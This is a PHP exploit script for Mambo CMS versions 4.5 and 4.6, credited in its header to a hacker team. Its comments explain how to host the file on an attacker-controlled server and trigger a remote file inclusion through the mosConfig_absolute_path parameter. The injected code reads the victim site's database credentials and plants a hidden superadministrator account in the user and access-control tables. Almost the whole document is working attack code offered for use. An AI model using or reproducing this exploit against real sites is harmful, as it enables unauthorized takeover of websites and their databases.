<?php
/*
|| Mambo OS v4.5 y v4.6 xploit
||
|| This script will insert a superadministrator user to the mambo database.
|| Change the variables bellow and upload this script to www.url.com/modules/mod_mainmenu.class.php
|| then go to the victim's url using that url.com like the value in mosConfig_absolute, ex.
||
|| http://www.vicitm.com/modules/mod_mainmenu.php?mosConfig_absolute_path=http://www.url.com
||
|| Advisory:  http://www.kernelpanik.org/docs/kernelpanik/mamboadv.txt
||
|| Yo_Soy - <yo_soy@raza-mexicana.org>
|| Raza Mexicana Hackers Team - http://www.raza-mexicana.org
*/

// Just change this vars ------------------------------
$hacker_nick = 'hax0r';
$hacker_pass = 'eaea';
$base_path_url = "/home/victim/public_html/";  # <-- ending slash
// ----------------------------------------------------

$body = <<<END
<?php
        \$hacker_nick = "$hacker_nick";
        \$hacker_pass = md5("$hacker_pass");
        \$base_path_url = "$base_path_url";

        include(\$base_path_url."configuration.php");
        \$conn = mysql_connect("\$mosConfig_host", "\$mosConfig_user", "\$mosConfig_password");
        mysql_select_db("\$mosConfig_db");
        \$rmht_sql = "INSERT INTO mos_users VALUES (800, 'hax0r', '\$hacker_nick', 'admin@wherever',
".
        "'\$hacker_pass', 'superadministrator', 0, 1, 25, '2003-11-11 00:00:00', '0000-00-00 00:00:00
'); ";
        \$resultado = mysql_query(\$rmht_sql);
        \$rmht_sql = "INSERT INTO mos_core_acl_aro VALUES (800,'users','800',0,'hax0r',0);";
        \$resultado = mysql_query(\$rmht_sql);
         \$rmht_sql = "INSERT INTO mos_core_acl_groups_aro_map VALUES (25,'',800);";
        \$resultado = mysql_query(\$rmht_sql);
        mysql_close(\$conn);
?>
END;
print $body;
?>
